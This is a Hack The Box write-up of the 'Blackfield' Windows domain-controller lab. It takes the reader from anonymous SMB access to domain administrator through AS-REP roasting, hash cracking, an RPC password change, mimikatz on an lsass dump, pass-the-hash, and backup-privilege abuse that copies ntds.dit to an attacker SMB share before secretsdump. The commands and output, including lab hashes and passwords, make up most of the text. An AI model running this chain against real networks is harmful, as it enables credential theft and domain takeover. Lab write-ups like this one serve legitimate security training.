---
layout: post
title: "Hack The Box - Blackfield Writeup"
author: Chr0x6eOs
date: "2020-10-03"
subject: "Blackfield Writeup"
keywords: [HTB, CTF, Hack The Box, Security, Chr0x6eOs, Windows, SMB, Kerberos, Bloodhound, LSASS, Mimikatz, NTDS.dit, SeBackupPrivilege, SeRestorePrivilege, Secretsdump]
lang: "en"
image:
    path: assets/htb/Blackfield/logo.png
    width: 300
    height: 300
...

![Blackfield](/assets/htb/Blackfield/blackfield.png)

[Blackfield](https://www.hackthebox.eu/home/machines/profile/255) is a hard windows box by [aas](https://www.hackthebox.eu/home/users/profile/6259).

### Overview

The box starts with smb-enumeration, where get a list of usernames. Using these users, we get the hash of the support user from Kerberos using GetNPUsers.py. Next, we crack the hash and enumerate the domain using Bloodhound. This shows us that we are able to change the password of another user. We then get access to an old version an lsass dump, which we use to get the NTLM hash of the user. Using the hash, we can login as read user.txt.

In order to get root, we exploit the Backup&Restore privileges, by backup up the system hive and ntds.dit. After getting both files, we can use secretsdump.py to get the administrator hash, login using evil-winrm and read root.txt.

## Information Gathering

### Nmap
We begin our enumeration with a nmap scan for open ports.

```bash
root@darkness:~# nmap -sC -sV 10.10.10.192
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 10:47 CEST
Nmap scan report for 10.10.10.192
Host is up (0.045s latency).
Not shown: 993 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-10-04 15:47:56Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)

Host script results:
|_clock-skew: 6h59m58s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-10-04T15:50:16
|_  start_date: N/A
```

## Enumeration

We have quite a few ports open. However, FTP (**21**), HTTP (**80**) and NFS (**2049**) seem the most interesting. Nmap tells us that anonymous FTP-access is allowed, so let us start our enumeration here.

### SMB - Port 445

Let us start our enumeration with SMB. We can try to list shares as a guest (anonymous) user.

```bash
root@darkness:~# smbmap -H 10.10.10.192 -u 'Anonymous'
[+] Guest session       IP: 10.10.10.192:445    Name: 10.10.10.192                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                NO ACCESS       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
```

Seems like we have read access to the `profiles$` share. Let mount the share and see what is in there.

```bash
root@darkness:~# mkdir /mnt/Blackfield;mount -o user=Anonymous -t cifs //10.10.10.192/profiles$ /mnt/BlackfieldPassword for Anonymous@//10.10.10.192/profiles$:                          
root@darkness:/mnt/Blackfield# ls -l                       
total 0                                                    
drwxr-xr-x 2 root root 0 Jun  3 18:47 AAlleni              
drwxr-xr-x 2 root root 0 Jun  3 18:47 ABarteski            
drwxr-xr-x 2 root root 0 Jun  3 18:47 ABekesz              
drwxr-xr-x 2 root root 0 Jun  3 18:47 ABenzies             
drwxr-xr-x 2 root root 0 Jun  3 18:47 ABiemiller           
drwxr-xr-x 2 root root 0 Jun  3 18:47 AChampken            
drwxr-xr-x 2 root root 0 Jun  3 18:47 ACheretei            
drwxr-xr-x 2 root root 0 Jun  3 18:47 ACsonaki             
drwxr-xr-x 2 root root 0 Jun  3 18:47 AHigchens    
drwxr-xr-x 2 root root 0 Jun  3 18:47 AJaquemai        
drwxr-xr-x 2 root root 0 Jun  3 18:47 AKlado               
drwxr-xr-x 2 root root 0 Jun  3 18:47 AKoffenburger
drwxr-xr-x 2 root root 0 Jun  3 18:47 AKollolli 
drwxr-xr-x 2 root root 0 Jun  3 18:47 AKruppe                                                                         
drwxr-xr-x 2 root root 0 Jun  3 18:47 AKubale
[...]
```

Seems like the profiles share contains a lot of different usernames. Let us save all theses usernames to a file for later usage.

```bash
root@darkness:~# ls /mnt/Blackfield/ > users.txt
root@darkness:~# wc -l users.txt 
314 users.txt
```

We now have 314 possible users, which may exist on this box.

### Kerberos - Port 88

Let us use these usernames on Kerberos using Impacket's `GetNPUsers.py` script.

```bash
root@darkness:~# GetNPUsers.py -usersfile users.txt -dc-ip 10.10.10.192 blackfield.local/ \
| grep -v "Client not found in Kerberos database"
Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation

[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:5443de7d6b3db1b046224522b3e3c34c$236b8c3a1cf215c5de8b64e8493d0fc3090096170a6fda707bf6fa81239623caa94097f937486a1ba1c1a48696d0c251e1f2d3eddbbbba80b83c02d52ccc591204c6f54ce6bdcceb0c53b34a205d0558021007747d47225f234d0b2dc5b29a4fb9ed7b0dbf3fcaa9f06a4d1ee83b18aad310bfe8c4630565ba1f27596d8d263b4c55b74f7317b30d559c474636c273f41ab8d33143e60054046e83f2d50995b300d1d38df786a1a49a4363f02fccb6674f2293e7bb3cb0e3c30a0f67a1090dd5ba440287401324a70c418bdf62510e06ee60130b724f3598094ebeeb60fdf4e5ddff55ae7bb43f5042df57c30099697ee906ef8a
[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
```

We get the hash for the user `support@BLACKFIELD.LOCAL`. Let us use hashcat to crack the hash.

```bash
hashcat64.exe -m 18200 hashes\blackfield.hash wl\rockyou.txt
hashcat (v5.1.0) starting...

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 1070, 2048/8192 MB allocatable, 15MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Dictionary cache hit:
* Filename..: wl\rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Approaching final keyspace - workload adjusted.

$krb5asrep$23$support@BLACKFIELD.LOCAL:13176c7b34c115ff5fa6363c22d5189c$eede10e66163a91892e1b753aec8db6376129ed6062f6ee78a7676bbec9d8279fd621b2443b0d1a06fa440c8aec08d2b0a199bf7eac5cb8332b51a221421998edb2cc4bf1d587433675d72bb34caeb31f90a9db76c3f1740498ff326b6059700616e6a26ca897eb0e2cbfec1623f3b9de6db09ed16e2b32143edbdfbba34037573b66d988c56ce0cbb501741fd2815fa69404619e9115d285bf5b0e4b63980f7232e4a33648442441c65f00daab753ffda08f7dc03a1deb45aa789f95433b6823c76ace79ca128f455c0b5a29de19f5b78a4e9d26e1bd60e9e158c8f24a9fa2b3aacdf8c02da2274877cab14213552fef1c1890e:#00^BlackKnight

Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:13176c7b34c1...c1890e
Time.Started.....: Sun Oct 04 11:00:55 2020 (3 secs)
Time.Estimated...: Sun Oct 04 11:00:58 2020 (0 secs)
Guess.Base.......: File (wl\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  6657.2 kH/s (7.14ms) @ Accel:512 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14254080/14344385 (99.37%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: $HEX[30313030363636] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Temp: 49c Fan:  0% Util: 21% Core:1797MHz Mem:4104MHz Bus:16

Started: Sun Oct 04 11:00:45 2020
Stopped: Sun Oct 04 11:00:58 2020
```

We successfully crack the hash of the `support` user with the password `#00^BlackKnight`.

### Bloodhound-Enumeration

Now that we have credentials for the `support` account, let us enumerate the Windows-Domain using Bloodhound. I will be using Bloodhound-Python, as 

```bash
root@darkness:~# bloodhound-python -u support -p '#00^BlackKnight' -c All -d blackfield.local -ns 10.10.10.192
INFO: Found AD domain: blackfield.local
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 18 computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found 315 users
INFO: Connecting to GC LDAP server: dc01.blackfield.local
INFO: Found 51 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 00M 10S
root@darkness:~# ls *.json
computers.json  domains.json  groups.json  users.json
```

Looking at our owned `support@blackfield.local` account, we can filter for connection to other users. Let us check our relation to the `audit2020@blackfield.local` user.

![Relationship between users](/assets/htb/Blackfield/bloodhound-changepw.png)

Seems like `support` is allowed to change the password of the `audito2020` account.

#### Changing password via RPC

We can now use `net rpc password` to change the password of `audit2020`.

```bash
root@darkness:~# net rpc password audit2020 -U support -S 10.10.10.192
Enter new password for audit2020: P@ssw0rd
Enter WORKGROUP\support password: #00^BlackKnight
```

Now that we have changed the user's password, let us enumerate furhter.

### SMB (Authenticated) - Port 445

Let us check SMB and see if we have any newly accessible folders.

```bash
root@darkness:~# smbmap -H 10.10.10.192 -u audit2020 -d Blackfield.local -p 'P@ssw0rd'
[+] IP: 10.10.10.192:445        Name: blackfield.local                                  
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                READ ONLY       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
```

Seems like we have access to the forensic share!

```bash
root@darkness:~# umount /mnt/Blackfield; mount -o user=audit2020 -t cifs //10.10.10.192/forensic /mnt/Blackfield
Password for audit2020@//10.10.10.192/forensic:  ********
root@darkness:/mnt/Blackfield# ls -alh
total 8.0K
drwxr-xr-x 2 root root 4.0K Feb 23  2020 .
drwxr-xr-x 4 root root 4.0K Oct  4 10:52 ..
drwxr-xr-x 2 root root    0 Feb 23  2020 commands_output
drwxr-xr-x 2 root root    0 May 28 22:28 memory_analysis
drwxr-xr-x 2 root root    0 Feb 23  2020 tools
root@darkness:/mnt/Blackfield# ls -alh memory_analysis/
total 495M
drwxr-xr-x 2 root root    0 May 28 22:28 .
drwxr-xr-x 2 root root 4.0K Feb 23  2020 ..
-rwxr-xr-x 1 root root  37M May 28 22:25 conhost.zip
-rwxr-xr-x 1 root root  24M May 28 22:25 ctfmon.zip
-rwxr-xr-x 1 root root  23M May 28 22:25 dfsrs.zip
-rwxr-xr-x 1 root root  18M May 28 22:26 dllhost.zip
-rwxr-xr-x 1 root root 8.5M May 28 22:26 ismserv.zip
-rwxr-xr-x 1 root root  40M May 28 22:25 lsass.zip
[...]
```

We have a lsass.zip file! Let us use mimikatz to read the lsass file.

#### Reading lsass using mimikatz

```bash
  .#####.   mimikatz 2.0 alpha (x86) release "Kiwi en C" (Apr  6 2014 22:02:03)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   https://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                    with  13 modules * * */

mimikatz # sekurlsa::minidump lsass.DMP
Switch to MINIDUMP : 'lsass.DMP'
mimikatz # sekurlsa::logonPasswords full
Opening : 'lsass.DMP' file for minidump...

Authentication Id : 0 ; 406458 (00000000:000633ba)
Session           : Interactive from 2
User Name         : svc_backup
Domain            : BLACKFIELD
Logon Server      : DC01
Logon Time        : 23/02/2020 20:00:03
SID               : S-1-5-21-4194615774-2175524697-3563712290-1413
        msv :
         [00000003] Primary
         * Username : svc_backup
         * Domain   : BLACKFIELD
         * NTLM     : 9658d1d1dcd9250115e2205d9f48400d
         * SHA1     : 463c13a9a31fc3252c68ba0a44f0221626a33e5c
         * DPAPI    : a03cd8e9d30171f3cfe8caad92fef621
        tspkg :
        wdigest :
         * Username : svc_backup
         * Domain   : BLACKFIELD
         * Password : (null)
        kerberos :
         * Username : svc_backup
         * Domain   : BLACKFIELD.LOCAL
         * Password : (null)
        ssp :
        credman :

[...]
```

We now have the NTLM hash of the user `svc_backup`, which allows us to login using PTH.

### Getting a shell as user using Pass-The-Hash

We can use evil-winrm to get a shell by supply the NTLM hash of the user.

```powershell
root@darkness:~# evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_backup\Documents> 
```

We get a shell as svc_backup and can now read user.txt.

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> type user.txt
dec92***************************
```

### Privesc

Now that we have a shell as `svc_backup`, let us enumerate the system to find a way to get to root.

#### Enumeration as svc_backup

Let us check out the privileges of the user first.

```powershell
*Evil-WinRM* PS C:\Users\svc_backup> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Seems like we have the `SeBackupPrivilege` and `SeRestorePrivilege`, which gives us arbitrary read access. I have found a nice [presentation](https://hackinparis.com/data/slides/2019/talks/HIP2019-Andrea_Pierini-Whoami_Priv_Show_Me_Your_Privileges_And_I_Will_Lead_You_To_System.pdf) talking about different privesc techniques.

#### Backup of the admin's desktop

```powershell
*Evil-WinRM* PS C:\tmp> robocopy C:\Users\Administrator\Desktop . /b                                                                                                                                                          -------------------------------------------------------------------------------                                   ROBOCOPY     ::     Robust File Copy for Windows                                                            -------------------------------------------------------------------------------
                                                                                                                 Started : Sunday, October 4, 2020 10:33:23 AM                                                                
   Source : C:\Users\Administrator\Desktop\                                                                    
     Dest : C:\tmp\                                    

    Files : *.*                                        

  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30                                                        

------------------------------------------------------------------------------

                           3    C:\Users\Administrator\Desktop\
            New File                 282        desktop.ini                                                    
  0%                                                   
100%                                                   
            New File                 447        notes.txt                                                      
  0%                                                   
100%                                                   
            New File                  32        root.txt                                                       
2020/10/04 10:33:23 ERROR 5 (0x00000005) Copying File C:\Users\Administrator\Desktop\root.txt
Access is denied.

*Evil-WinRM* PS C:\tmp> dir

    Directory: C:\tmp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/28/2020   4:36 PM            447 notes.txt
```

Seems like we have been able to copy one file of the desktop: `notes.txt.`

Let us have a look at it...

```powershell
*Evil-WinRM* PS C:\tmp> type notes.txt
Mates,

After the domain compromise and computer forensic last week, auditors advised us to:
- change every passwords -- Done.
- change krbtgt password twice -- Done.
- disable auditors account (audit2020) -- KO.
- use nominative domain admin accounts instead of this one -- KO.

We will probably have to backup & restore things later.
- Mike.

PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
```

The note does not contain interesting information, but instead explains why we have the backup and restore privileges.

#### Backup of system.hive and ntds.dit

With the backup and restore privileges, we can now backup the system hive and ntds.dit to get access to the password hashes of all domain-users.

Let us backup the system hive first.

```powershell
*Evil-WinRM* PS C:\tmp> reg save HKLM\SYSTEM c:\tmp\system.hive
The operation completed successfully.
```

We can now copy the system hive to our machine.

Next let us backup the ntds.dit file. For this we need to setup a smb-server and then use `wbadmin` to backup the file. Then we can restore it without the file-permissions to get read-access to it.

```bash
root@darkness:~# docker run -it -p 139:139 -p 445:445 -d dperson/samba -p -s "share;/mnt/smb;yes;no;yes"
```

Now let us start the backup-process.

```powershell
*Evil-WinRM* PS C:\tmp> wbadmin start backup -backupTarget:\\10.10.14.15\share\ -include:C:\windows\ntds\ntds.dit -quiet
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.


Note: The backed up data cannot be securely protected at this destination.
Backups stored on a remote shared folder might be accessible by other
people on the network. You should only save your backups to a location
where you trust the other users who have access to the location or on a
network that has additional security precautions in place.

Retrieving volume information...
This will back up (C:) (Selected Files) to \\10.10.14.15\share\.
The backup operation to \\10.10.14.15\share\ is starting.
Creating a shadow copy of the volumes specified for backup...
Please wait while files to backup for volume (C:) are identified.
This might take several minutes.
Creating a shadow copy of the volumes specified for backup...
Please wait while files to backup for volume (C:) are identified.
This might take several minutes.
Please wait while files to backup for volume (C:) are identified.
This might take several minutes.
Scanning the file system...
Please wait while files to backup for volume (C:) are identified.
This might take several minutes.
Found (4) files.
Scanning the file system...
Creating a backup of volume (C:), copied (100%).
Summary of the backup operation:
------------------

The backup operation successfully completed.
The backup of volume (C:) completed successfully.
Log of files successfully backed up:
C:\Windows\Logs\WindowsServerBackup\Backup-04-10-2020_17-48-38.log
```

Let us quickly connect to our container and see what the backup looks like on the smb-server.

```bash
root@darkness:~# docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                   PORTS                                                     NAMES
e2ca224b5a44        dperson/samba       "/sbin/tini -- /usr/…"   8 minutes ago       Up 8 minutes (healthy)   0.0.0.0:139->139/tcp, 137-138/udp, 0.0.0.0:445->445/tcp   festive_brahmagupta
root@darkness:~# docker exec -it e2ca224b5a44 bash
bash-5.0# ls -alh /mnt/smb/
total 20K    
drwxrwxr-x    4 smbuser  smb         4.0K Oct  4 10:48 .
drwxr-xr-x    1 root     root        4.0K Oct  4 10:41 ..
drwxrwxr-x    3 smbuser  smb         4.0K Oct  4 10:50 .deleted
drwxrwxr-x    3 smbuser  smb         4.0K Oct  4 10:48 WindowsImageBackup
bash-5.0# ls -alh /mnt/smb/WindowsImageBackup/DC01/
total 48K    
drwxrwxr-x    5 smbuser  smb         4.0K Oct  4 10:50 .
drwxrwxr-x    3 smbuser  smb         4.0K Oct  4 10:48 ..
drwxrwxr-x    2 smbuser  smb         4.0K Oct  4 10:50 Backup 2020-10-04 174838
drwxrwxr-x    2 smbuser  smb         4.0K Oct  4 10:50 Catalog
-rwxrwxr-x    1 smbuser  smb           16 Oct  4 10:48 MediaId
drwxrwxr-x    2 smbuser  smb         4.0K Oct  4 10:50 SPPMetadataCache
```

The backup is stored at `WindowsImageBackup/DC01/Backup 2020-10-04 174838`.

Let us restore the `ntds.dit` file now. For this we have to check for available backups:

```powershell
*Evil-WinRM* PS C:\tmp> wbadmin get versions
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.

Backup time: 10/4/2020 10:48 AM
Backup location: Network Share labeled \\10.10.14.15\share\
Version identifier: 10/04/2020-17:48
Can recover: Volume(s), File(s)
```

We can now use the backup to recover the file.

```powershell
*Evil-WinRM* PS C:\tmp> wbadmin start recovery -version:10/04/2020-17:48 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\tmp\ -notrestoreacl -quiet
wbadmin 1.0 - Backup command-line tool
(C) Copyright Microsoft Corporation. All rights reserved.

Retrieving volume information...
You have chosen to recover the file(s) c:\windows\ntds\ntds.dit from the
backup created on 10/4/2020 10:48 AM to C:\tmp\.
Preparing to recover files...

Running the recovery operation for c:\windows\ntds\ntds.dit, copied (9%).
Currently recovering c:\windows\ntds\ntds.dit.
Running the recovery operation for c:\windows\ntds\ntds.dit, copied (59%).
Currently recovering c:\windows\ntds\ntds.dit.
Successfully recovered c:\windows\ntds\ntds.dit to C:\tmp\.
The recovery operation completed.
Summary of the recovery operation:
--------------------

Recovery of c:\windows\ntds\ntds.dit to C:\tmp\ successfully completed.
Total bytes recovered: 18.00 MB
Total files recovered: 1
Total files failed: 0

Log of files successfully recovered:
C:\Windows\Logs\WindowsServerBackup\FileRestore-04-10-2020_17-56-02.log

*Evil-WinRM* PS C:\tmp> dir


    Directory: C:\tmp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/4/2020  10:48 AM       18874368 ntds.dit
```

We can now use evil-winrm to download the file.

```powershell
*Evil-WinRM* PS C:\tmp> download ntds.dit
Info: Downloading C:\tmp\ntds.dit to ntds.dit
```

#### Getting hashes using secretsdump

Now that we have dumped both system.hive and ntds.dit, we can get the hashes of the users using Impacket-Secretsdump.

```bash
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL -hashes L
MHASH:NTHASH -outputfile extracted.txt                                                                                
Impacket v0.9.22.dev1+20200611.111621.760cb1ea - Copyright 2020 SecureAuth Corporation                                
                                                                                                                      
[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393                                              
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                              
[*] Searching for pekList, be patient                                                                                 
[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c                                                     
[*] Reading and decrypting hashes from ntds.dit                                                                       
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::                     
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                        
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:65557f7ad03ac340a7eb12b9462f80d6:::                                       
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::                            
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:c95ac94a048e7c29ac4b4320d7c9d3b5:::                        
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::                                     
BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
[...]
```

We have successfully extracted the admin hash: `Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::                     ` and can now login using evil-winrm.

#### Getting shell as administrator

```powershell
root@darkness:~# evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

We successfully login as administrator and can read root.txt.

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
4375a***************************
```
